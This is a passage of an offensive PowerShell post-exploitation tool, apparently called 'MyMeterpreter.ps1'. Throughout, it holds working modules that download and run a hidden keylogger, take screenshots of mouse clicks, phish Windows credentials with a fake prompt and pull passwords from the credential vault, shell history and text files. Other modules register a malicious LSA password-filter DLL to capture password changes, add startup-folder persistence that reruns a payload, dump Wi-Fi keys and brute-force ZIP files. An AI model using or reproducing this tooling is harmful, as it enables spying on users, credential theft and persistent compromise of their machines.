         Write-Host "[abort] $Upload `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }Else{
         ## File (script) successfuly Downloaded
         $Success = $True
      }
   }

   <#
   .NOTES
      This next function only accepts Binary.exe until 80/KB of File Size
      If you wish to increase the Size Limmit then modifie the follow line:
      If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
   #>

   ## Check for downloaded Binary (exe) integrity
   If($Upload -iMatch '[.exe]$'){## Binary file download detected
      $SizeDump = ((Get-Item "$Destination" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
         Write-Host "[abort] $Upload Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "[error] If you wish to increase the File Size Limmit, then manual"
         Write-Host "[error] edit this CmdLet and modifie line[1532]: If(`$SizeDump -lt 80){"
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }
   }

   ## Build Object-Table Display
   If(Test-Path -Path "$Destination"){
      Get-ChildItem -Path "$Destination" -EA SilentlyContinue|Select-Object Directory,Name,Exists,CreationTime > $Env:TMP\Upload.log
      Get-Content -Path "$Env:TMP\Upload.log"
      Remove-Item "$Env:TMP\Upload.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   <#
   .SYNOPSIS
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Start
      Download/Execute void.exe in child process
      to be abble to capture system keystrokes

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier
      and delete keylogger and all respective files/logs

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>

   If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
      write-host "[+] Capture $Remote_hostName\$Env:USERNAME keystrokes." -ForeGroundColor Green;Start-Sleep -Seconds 1
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null   

      ## Check for Failed/Corrupted downloads
      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
      If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using BitsTransfer
         Write-Host "[fail] to download void.zip using BitsTransfer (BITS)" -ForeGroundColor Red -BackgroundColor Black
      }Else{

         ## De-Compress Keylogger Archive files into $env:TMP remote directory
         Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
         Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void.zip" -Force

         ## Start void.exe in an orphan process
         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
         Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
         Start-Sleep -Milliseconds 2600;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

         ## Create Data Table for output
         $mytable = New-Object System.Data.DataTable
         $mytable.Columns.Add("StartTime")|Out-Null
         $mytable.Columns.Add("ProcessName")|Out-Null
         $mytable.Columns.Add("PID")|Out-Null
         $mytable.Columns.Add("LogFile")|Out-Null
         $mytable.Rows.Add("$KeyLoggerTimer",
                           "void.exe",
                           "$PIDS",
                           "$Env:TMP\void.log")|Out-Null

         ## Display Data Table
         $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
         Get-Content -Path "$Env:TMP\KeyDump.log"
         Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
      }
   }

   If($Keylogger -ieq 'Stop'){
      ## Dump captured keystrokes
      # Stops process and Delete files/logs
      Write-Host "Captured keystrokes" -ForegroundColor Green
      Write-Host "-------------------"
      If(Test-Path -Path "$Env:TMP\void.log"){## Read keylogger logfile
         $parsedata = Get-Content -Path "$Env:TMP\void.log"
         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]",""  -replace "\[CTRL\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
         Write-Host "$Diplaydata"
      };Write-Host ""
      write-host "[+] Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
      $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

      If($IDS){## keylogger process found
         taskkill /F /IM void.exe|Out-Null
         If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
            write-host "[i] Keylogger PID $IDS process successfuly stoped!" -ForegroundColor Yellow
         }Else{
            write-host "[fail] to terminate keylogger PID process!" -ForeGroundColor Red -BackgroundColor Black
         }
      }Else{
         write-host "[fail] keylogger process PID not found!" -ForeGroundColor Red -BackgroundColor Black
      }

      ## Clean old keylogger files\logs
      Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
      write-host "";Start-Sleep -Seconds 1
   }
}

If($Mouselogger -ieq "Start"){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
## Set the max\min capture time value
# Remark: The max capture time its 300 secs {5 minuts}

   <#
   .SYNOPSIS
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'
      with the help of psr.exe native windows 10 (error report service).
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Mouselogger Start"
   Write-Host "Example: .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10`n"
   Start-Sleep -Seconds 1

   ## Make sure psr.exe (LolBin) exists on remote host
   If(Test-Path "$Env:WINDIR\System32\psr.exe"){

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("Capture")|Out-Null
      $mytable.Columns.Add("Timmer")|Out-Null
      $mytable.Columns.Add("Storage")|Out-Null
      $mytable.Rows.Add("MouseClicks",
                        "for $Timmer(sec)",
                        "$CaptureFile")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
      Get-Content -Path "$Env:TMP\MyTable.log"
      Remove-Item -Path "$Env:TMP\MyTable.log" -Force

      ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
      Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $Timmer;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @MyMeterpreter cant start psr.exe process" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2}
   }Else{
      ## PSR.exe (error report service) not found in current system ..
      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
      Start-Sleep -Seconds 1
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($PhishCreds -ieq "Start"){

   <#
   .SYNOPSIS
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: CredsPhish.ps1 CmdLet requires Admin privileges to Start|Stop services.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>

   ## Download CredsPhish from my github repository
   Write-Host "[+] Prompt the current user for a valid credential." -ForeGroundColor Green
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1")){## Check for auxiliary existence
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/CredsPhish.ps1 -Destination $Env:TMP\CredsPhish.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 12,77734375/KB | OldSize: 6,15625/KB | 6,728515625/KB
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 6 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      #If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Start Remote Host CmdLet
   powershell -exec bypass -NonInteractive -NoLogo -File $Env:TMP\CredsPhish.ps1
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){## <-- TODO: finish this function

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Search for credentials in diferent locations {store|regedit|disk}
      Helper - Stealing passwords every time they change {mitre T1174}

   .DESCRIPTION
      -GetPasswords Dump Explores a native OS notification of when
      the user account password gets changed which is responsible for
      validating it. That means that the password can be intercepted and logged.
      -GetPasswords Enum searchs credentials in disk\regedit diferent locations.

   .NOTES
      -GetPasswords Dump requires Administrator privileges to add reg keys
      And the manual deletion of `$Env:WINDIR\System32\0evilpwfilter.dll from
      target disk at the end and also the deletion of the follow registry key:
      hklm\system\currentcontrolset\control\lsa /v "notification packages" /d scecli\0evilpwfilter
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum
      Dumps passwords from disk\regedit diferent locations

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
      Searches for credentials recursive in text files starting in -StartDir

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon}

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>

   ## Local function variable declarations
   $VulnDll = "$Env:WINDIR\System32\0evilpwfilter.dll"
   $DllStatus = "not active"

   ## Sellecting module Scan mode
   If($GetPasswords -ieq "Enum"){## <-- TODO: finish this function

      Write-Host "Checking credential store" -ForegroundColor Green
      Start-Sleep -Seconds 1
      ## Dump local passwords from credential manager
      [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
      $vault = New-Object Windows.Security.Credentials.PasswordVault
      $allpass = $vault.RetrieveAll() | % { 
         $_.RetrievePassword(); $_ 
      }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
      If($allpass -ieq $null){## Error => none credentials found under PasswordVault
         write-host "[error] none credentials found under PasswordVault!" -ForegroundColor Red -BackgroundColor Black
      }

      Write-Host "`nChecking ConsoleHost_History" -ForegroundColor Green
      Start-Sleep -Seconds 1
      $PSHistory = "$Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt"
      $Credentials = Get-Content -Path "$PSHistory"|Select-String -pattern "pass","passw","user","username","login"
      If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned
         Write-Host "[error] None Credentials found in ConsoleHost_History" -ForegroundColor Red -BackgroundColor Black
      }else{## Credentials found
         Write-Host "----------------------------"
         ForEach($token in $Credentials){# Loop in each string found
            Write-Host "$token"
         }
      }

      Start-Sleep -Seconds 1
      ## List Stored Passwords {in Text Files}
      Write-Host "`nStored passwords in text files" -ForegroundColor Green
      Start-Sleep -Seconds 1
      cd $StartDir|findstr /S /I /C:"user:" *.txt >> $Env:TMP\passwd.txt
      cd $StartDir|findstr /S /I /C:"pass:" *.txt >> $Env:TMP\passwd.txt
      cd $StartDir|findstr /S /I /C:"username:" *.txt >> $Env:TMP\passwd.txt
      cd $StartDir|findstr /S /I /C:"passw:" *.txt >> $Env:TMP\passwd.txt
      cd $StartDir|findstr /S /I /C:"login:" *.txt >> $Env:TMP\passwd.txt
      cd $Working_Directory ## Return to @MyMeterpreter working dir

      $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt"|Select-String -pattern "pass","passw","user","username","login"
      If($ChekCreds -ieq $null){## None credentials found
         Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
      }Else{## Credentials found

         Write-Host "------------------------------"
         ForEach($token in $ChekCreds){# Loop in each string found
            Write-Host "$token"
         }
      }
      If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}


   }ElseIf($GetPasswords -ieq "Dump"){
      ## This function requires Admin privileges to add reg keys
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

      If($IsClientAdmin){## Administrator privileges active
         $TestVuln = reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
         If($TestVuln){## Vulnerable registry key present

            ## Download 0evilpwfilter.dll from my GitHub repository
            If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
               Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
            }

            ## Make sure the downloaded DLL its not corrupted
            $CheckInt = Get-Content -Path "$VulnDll" -EA SilentlyContinue
            If(-not(Test-Path -Path "$VulnDll") -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
               ## Fail to download 0evilpwfilter.dll using BitsTransfer OR the downloaded file is corrupted
               Write-Host "[abort] fail to download 0evilpwfilter.dll using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
               If(Test-Path -Path "$VulnDll"){Remove-Item -Path "$VulnDll" -Force}
                  Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
               }

            ## Add Registry key to regedit
            reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz /f
            $DllTimer = Get-Date -Format 'HH:mm:ss'
            $DllStatus = "active"
         }

         ## Create Data Table for output
         $mytable = new-object System.Data.DataTable
         $mytable.Columns.Add("Time") | Out-Null
         $mytable.Columns.Add("Status") | Out-Null
         $mytable.Columns.Add("ReportFile") | Out-Null
         $mytable.Columns.Add("VulnDLLPath") | Out-Null
         $mytable.Rows.Add("$DllTimer",
                           "$DllStatus",
                           "C:\Temp\logFile.txt",
                           "$VulnDll") | Out-Null

         ## Display Table
         $mytable|Format-Table -AutoSize
      }## Running Under UserLand Privileges
      Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
   }## Sellecting module Scan mode
   Write-Host "";Start-Sleep -Seconds 1
}

If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>

   ## Download Sherlock (@_RastaMouse) from my github repository
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1")){## Check if auxiliary exists
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/sherlock.ps1 -Destination $Env:TMP\sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB)
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 16 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
      Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Import-Module (-Force reloads the module everytime)
   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
      Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
      If($EOP -ieq "Verbose"){## Use ALL Sherlock EoP functions
         Write-Host "[i] Please wait, this scan migth take more than 5 minuts!" -ForegroundColor Yellow -BackgroundColor Black
         Start-Sleep -Seconds 1;Use-AllModules FullRecon
      }ElseIf($EOP -ieq "Enum"){## find missing CVE patchs
         Use-AllModules
      }
   }
   
   ## Delete sherlock script from remote system
   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
$BeaconRawTime = "$BeaconTime" + "000" ## BeaconHome Timmer
$PCName = $Env:COMPUTERNAME ## Local Computer Name
$PerState = $False ## Persistence active yes|no query!

   <#
   .SYNOPSIS
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Use double quotes if Path has any empty spaces in name.
      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
      to manual check the status of wscript process (BeaconHome function)

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste Stop"
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Client.ps1"
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Client.ps1 -BeaconTime 10`n"
   Start-Sleep -Seconds 2

   ## Variable Declarations
   $ClientName = $Persiste.Split('\\')[-1] ## Get File Name from Path
   $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs"


   If($Persiste -ne "false" -and $Persiste -ne "Stop"){

      ## Make sure User Input [ -Persiste ] [ Path-to-payload ] is valid
      If(-not(Test-Path -Path "$Persiste")){## Check for file existence
         Write-Host "[error] Not found [ $Persiste ] in $Remote_hostName!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter because of User Input error.
      }

      ## Retrieve BeaconTime from persiste.vbs
      # If run for the 2º time [ -Persiste ] [ Path-to-payload ] 
      # Then the BeaconTime will be retrieved from persiste.vbs
      If(Test-Path -Path "$PersistePath"){
         $diskImage = Get-Content -Path $PersistePath|findstr /C:"wscript.sleep"
         $RetBeTiFrP = $diskImage -split(' ') ## Split into two arrays
         ## Retrieve BeaconTime value from 2º array
         # and replace (convert) miliseconds to seconds
         $BeaconTime = $RetBeTiFrP[1] -replace '000',''
      }

      ## Create Data Table for output
      Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
      Write-Host "-------------------------------"
      Write-Host "BeaconHomeInterval : $BeaconTime (sec) interval"
      Write-Host "ClientAbsoluctPath : $Persiste"
      Write-Host "PersistenceScript  : $PersistePath"
   
      ## Create VBS beacon Home script
      If(-not(Test-Path -Path "$PersistePath" -EA SilentlyContinue)){         
         echo "Set objShell = WScript.CreateObject(`"WScript.Shell`")" > "$PersistePath"
         echo "Do" >> "$PersistePath"
         echo "wscript.sleep $BeaconRawTime" >> "$PersistePath"
         echo "objShell.Run `"powershell -Exec Bypass -W 1 -File $Persiste`", 0, True" >> "$PersistePath"
         echo "Loop" >> "$PersistePath"
      }

      ## Make sure Persiste vbs script its created
      If(Test-Path -Path "$PersistePath"){
         Write-Host "PersistenceScript  : Successfuly Created!"
      }Else{
         Write-Host "PersistenceScript  : Fail to create Persiste.vbs!" -ForegroundColor Red -BackgroundColor Black
      }

      ## Make sure wscript process its running
      $VbsProc = (Get-Process wscript -EA SilentlyContinue).Responding
      If($VbsProc -ieq "True"){
         Write-Host "wscriptProcStatus  : Wscript Process Running! {*BeaconHome*}"
      }Else{
         Write-Host "wscriptProcStatus  : Stopped! {require $Remote_hostName restart}" -ForegroundColor Red -BackgroundColor Black
         Write-Host "OR the manual execution of Persiste.vbs script! {StartUp}"

      }
   }
   

   ## Stop\Delete Persistence tasks
   If($Persiste -ieq "Stop"){## Check for wscript process status

      Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
      Write-Host "-------------------------"
      Start-Sleep -Seconds 1

      $CheckProc = (Get-Process -name wscript -EA SilentlyContinue).Responding
      If($CheckProc -ieq "True"){## wscript proccess found running
         Write-Host "[i] Stoping Wscript (vbs) Process!"
         Stop-Process -Name wscript -Force
         $PerState = $True
      }

      If(Test-Path -Path "$PersistePath"){## Chcek for Persiste.vbs existance
         Write-Host "[i] Deleting Persiste.vbs aux Script!"
         Remove-Item -Path "$PersistePath" -Force
         $PerState = $True
      }
      If($PerState -eq $True){## Report Persistence files|wscript process state
         Write-Host "[i] Local Persistence Successfuly Deleted!" -ForegroundColor Yellow
      }Else{
         Write-Host "[error] None persistence files found left behind!" -ForegroundColor Red -BackgroundColor Black      
      }
   }     
   Write-Host "";Start-Sleep -Seconds 1
}

If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){
$FileName = "SSIDump.zip" ## Default Zip Archive Name

   <#
   .SYNOPSIS
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>

   ## Capture wifi interface passwords
   If($WifiPasswords -ieq "Dump"){

      ## Display SSID Wifi passwords dump into terminal windows
      $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
      $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''

      ## Create Data Table for output
      $mytable = new-object System.Data.DataTable
      $mytable.Columns.Add("SSID name") | Out-Null
      $mytable.Columns.Add("Password") | Out-Null

      ForEach($Token in $DataParse){
         $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
         $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
         ## Put results in the data table   
         $mytable.Rows.Add("$Token",
                           "$Key") | Out-Null
      }

      ## Display Table
      $mytable|Format-Table -AutoSize

   }ElseIf($WifiPasswords -ieq "ZipDump"){

      ## Dump SSID Wifi profiles passwords into a zip file
      If(-not(Test-Path "$Storage\SSIDump")){## Create Zip Folder
         New-Item "$Storage\SSIDump" -ItemType Directory -Force
      }
      cd $Storage\SSIDump;netsh wlan export profile folder=$Storage\SSIDump key=clear|Out-Null
      Compress-Archive -Path "$Storage\SSIDump" -DestinationPath "$Storage\$FileName" -Update
      Write-Host "`n`n[+] SSID Dump: $Storage\$FileName" -ForeGroundColor Yellow
      cd $Working_Directory ## Return to @MyMeterpreter Working Directory
   }
   ## Clean Old Dump Folder
   If(Test-Path "$Storage\SSIDump"){Remove-Item "$Storage\SSIDump" -Recurse -Force}
}

If($BruteZip -ne "false"){

   <#
   .SYNOPSIS
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Author: @securethelogs|@r00t-3xp10it
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .LINK
      https://github.com/securethelogs/Powershell/tree/master/Redteam
      https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt
   #>

   ## Local Var declarations
   $Thepasswordis = $null
   $PasFileStatus = $False
   $PassList = "$Env:TMP\passwords.txt"
   $7z = "C:\Program Files\7-Zip\7z.exe"

   If(-not(Test-Path -Path "$BruteZip")){## Make sure Archive exists
      Write-Host "[error] Zip archive not found: $BruteZip!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
   }Else{## Archive found
      $ZipArchiveName = $BruteZip.Split('\\')[-1] ## Get File Name from Path
